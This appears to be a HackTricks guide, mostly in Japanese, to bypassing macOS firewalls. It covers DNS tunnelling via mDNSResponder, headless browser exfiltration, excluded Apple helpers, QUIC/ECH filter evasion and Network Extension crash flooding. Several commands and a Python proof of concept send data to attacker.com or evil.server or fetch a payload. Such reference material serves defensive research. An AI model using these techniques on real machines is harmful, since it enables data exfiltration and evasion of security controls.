# macOS Firewall Bypassing

{{#include ../../banners/hacktricks-training.md}}

## Found techniques

以下のtechniqueは、一部のmacOS firewall appで機能することが確認されています。

### Abusing whitelist names

- 例えば、malwareを **`launchd`** のような、よく知られたmacOS processの名前で実行する

### Synthetic Click

- firewallがuserにpermissionを求めた場合、malwareに **allow** をclickさせる

### **Use Apple signed binaries**

- **`curl`** など。また、**`whois`** のような他のものも使用できる

### Well known apple domains

firewallが **`apple.com`** や **`icloud.com`** など、よく知られたApple domainへのconnectionをallowしている可能性があります。また、iCloudをC2として使用できます。

### Generic Bypass

firewallをbypassするために試せるいくつかのidea

### Check allowed traffic

許可されているtrafficを把握することで、whitelistに登録されている可能性のあるdomainや、accessが許可されているapplicationを特定しやすくなります
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNSの悪用

macOSでは、プロセスがDNSサーバーと直接通信することはありません。名前解決は、Apple署名のシステムデーモンである **`mDNSResponder`** (`/usr/sbin/mDNSResponder`) によって **XPC** 経由で仲介されるため、マシン上のすべてのlookupは、それを要求したプロセスではなく、**`mDNSResponder`からの**トラフィックとしてホストを出ます。したがってファイアウォールは、このデーモンを無条件に信頼する傾向があります — これを拒否すると、システム全体の名前解決が壊れてしまうためです。<sup>[[1]](#references)</sup>

そのため、ファイアウォールがマルウェア自身のソケットをブロックしていても、DNSは開いたままのチャネルになります。<sup>[[1]](#references)</sup>

1. マルウェアが`evil.com`への接続を試みます。**自身の**アウトバウンド接続はファイアウォールによって検査され、**ブロック**されます。
2. 代わりにマルウェアは、XPC経由で`mDNSResponder`に`evil.com`の**resolve**を依頼します。
3. ファイアウォールは結果として生じたクエリを検査し、信頼されたApple署名のresolverを送信元として認識し、**許可**します。
4. クエリはDNSサーバーに到達します — そして攻撃者が`evil.com`のauthoritative serverを運用していれば、通信の両端を制御できます。

攻撃者はそのゾーンを所有しているため、「接続」は一切必要ありません。データは**照会されるlabel**（例：`<encoded-chunk>.evil.com`）の内部にsmuggleされ、コマンドは**answer record**（TXT、A、CNAME…）の内部に返されます。これは、完全にwhitelistされたプロセス上で動作する、classicなDNS tunnellingです。

権限のないプロセスであってもデーモンを直接操作できるため、次の方法でこの経路が開いていることを簡単に確認できます。
```bash
# resolution is performed by mDNSResponder on the caller's behalf
dns-sd -G v4v6 evil.com
```
### ブラウザアプリ経由

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### プロセスインジェクション経由

**コードをプロセスにインジェクト**でき、そのプロセスが任意のサーバーへの接続を許可されている場合、firewall の保護をバイパスできます。


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## 最近の macOS firewall bypass 脆弱性（2023-2025）

### Web content filter（Screen Time）bypass – **CVE-2024-44206**
2024年7月、Apple は Screen Time のペアレンタルコントロールで使用されるシステム全体の「Web content filter」を機能させなくする、Safari/WebKit の重大なバグを修正しました。
特別に細工された URI（例えば、二重に URL-encoded された「://」を含むもの）は Screen Time の ACL では認識されませんが、WebKit では受け入れられるため、リクエストがフィルタリングされずに送信されます。そのため、URL を開けるあらゆるプロセス（sandboxed または unsigned code を含む）が、ユーザーまたは MDM profile によって明示的にブロックされたドメインへ到達できます。<sup>[[2]](#references)</sup>

実際のテスト（未修正システム）：
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### 初期の macOS 14「Sonoma」における Packet Filter (PF) のルール順序付けバグ
macOS 14 の beta サイクル中、Apple は **`pfctl`** 周辺の userspace wrapper に regression を導入しました。
`quick` keyword（多くの VPN kill-switches で使用）を付けて追加されたルールが silently ignored され、VPN/firewall GUI が *blocked* と報告している場合でも traffic leaks が発生しました。この bug は複数の VPN vendors によって確認され、RC 2（build 23A344）で修正されました。<sup>[[6]](#references)</sup>

Quick leak-check:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Apple-signed helper services の悪用（legacy – macOS 11.2 より前）
macOS 11.2 より前は、**`ContentFilterExclusionList`** により、**`nsurlsessiond`** や App Store など約 50 個の Apple バイナリが、Network Extension framework で実装されたすべての socket-filter firewall（LuLu、Little Snitch など）を bypass できました。
Malware は、除外されたプロセスを spawn するか、そこへ code を inject するだけで、すでに許可されている socket 経由で自身の traffic を tunnel できました。Apple は macOS 11.2 で exclusion list を完全に削除しましたが、upgrade できない system ではこの technique が依然として relevant です。<sup>[[3]](#references)</sup>

Example proof-of-concept（pre-11.2）：
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH による Network Extension のドメインフィルター回避（macOS 12+）
NEFilter Packet/Data Providers は TLS ClientHello の SNI/ALPN を基準に動作します。**HTTP/3 over QUIC（UDP/443）** と **Encrypted Client Hello（ECH）** を使用すると、SNI は暗号化されたままとなり、NetExt はフローを解析できません。その結果、ホスト名ルールが fail-open になることが多く、malware は DNS に触れることなく、ブロックされたドメインへ到達できます。<sup>[[5]](#references)</sup>

最小限の PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
QUIC/ECH がまだ有効な場合、これは hostname-filter を回避する簡単な経路です。

### macOS 15 “Sequoia” Network Extension の不安定性（2024–2025）
初期の 15.0/15.1 ビルドでは、サードパーティ製の **Network Extension** フィルター（LuLu、Little Snitch、Defender、SentinelOne など）がクラッシュします。フィルターが再起動すると、macOS はフローのルールを削除し、多くの製品は fail-open になります。数千件の短い UDP フローをフィルターに送り込む（または QUIC/ECH を強制する）ことで、クラッシュを繰り返し発生させ、GUI では firewall が稼働中と表示されたまま、C2/exfil のための隙を残すことが可能です。<sup>[[4]](#references)</sup>

簡単な再現（安全な lab box）：
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## 最新の macOS 向け Tooling のヒント

1. GUI firewall が生成する現在の PF ルールを確認します。
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. すでに *outgoing-network* entitlement を保持しているバイナリを列挙します（piggy-backing に便利です）。
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Objective-C/Swift で独自の Network Extension content filter をプログラムから登録します。
パケットをローカルソケットに転送する最小限の rootless PoC は、Patrick Wardle の **LuLu** ソースコードで確認できます。

## 参考資料

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: macOS Firewall の作成と突破](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Apple の web content filter bypass により、ブロックされたコンテンツへ無制限にアクセス可能（CVE-2024-44206） - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple、アプリによる Firewall Security のバイパスを可能にしていた macOS 機能を削除 - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [macOS Sequoia のアップデート後に Cybersecurity Products が機能停止 - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Network protection を使用して macOS から悪意のあるサイトへの接続を防止する - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)
- [6] [macOS 14 Sonoma の firewall bug を修正！ - Mullvad VPN Blog](https://mullvad.net/en/blog/2023/9/22/macos-14-sonoma-firewall-bug-fixed)

{{#include ../../banners/hacktricks-training.md}}
